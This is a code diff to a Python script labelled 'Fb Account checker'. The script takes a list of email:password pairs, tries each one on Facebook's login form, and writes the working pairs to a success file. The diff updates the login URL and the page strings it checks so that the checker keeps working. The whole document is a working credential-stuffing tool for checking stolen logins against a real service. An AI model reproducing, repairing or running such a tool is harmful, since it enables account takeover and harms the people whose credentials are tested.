@@ -1,11 +1,10 @@
 from robobrowser import RoboBrowser
-from termcolor import colored
-print(colored('''
+print('''
         ======================================
         ==        Fb Account checker        ==
         ==      Coded By Ahmed Mubarak      ==
         ======================================
-''' , 'blue'))
+''')
 path = input("Set list name Here ===> ")
 file = open(path, 'r')
 check_list = open('account_error.txt', 'a')
@@ -18,22 +17,22 @@ for i in file:
     email = field[0]
     password = field[1]
     driver = RoboBrowser()
-    driver.open("https://m.facebook.com")
+    driver.open("https://www.facebook.com/")
     form = driver.get_form(id='login_form')
     form['email'].value = email
     form['pass'].value = password
-    driver.submit_form(form, submit=form['login'])
+    driver.submit_form(form)
     src = str(driver.parsed())
-    if 'login_error' in src:
+    if '/login/device-based/regular/' in src:
         check_list.write('[login error[!] check email or password! ] ' + email + ':' + password)
-        print(colored('[login error[!] check email or password! ] ' + email + ':' + password, 'red'))
-    elif 'checkpoint_title' in src:
+        print('[login error[!] check email or password! ] ' + email + ':' + password)
+    elif 'checkpoint' in src:
         check_list.write('[Account Check Point Error !! ] '+email + ':' + password)
-        print(colored('[Account Check Point Error !! ] '+email + ':' + password, 'red'))
-    elif 'Log In With One Tap' in src:
+        print('[Account Check Point Error !! ] '+email + ':' + password)
+    else:
         done_list.write('[Account Work successfully ! ] ' + email + ":" + password)
-        print(colored('[Account Work successfully ! ] ' + email + ":" + password, 'green'))
-print(colored('the list has been checked successfully enjoy :)', 'magenta'))
-print(colored("Coded By Ahmed Mubarak", 'magenta'))
+        print('[Account Work successfully ! ] ' + email + ":" + password)
+print('the list has been checked successfully enjoy :)')
+print("Coded By Ahmed Mubarak")
 check_list.close()
 done_list.close()
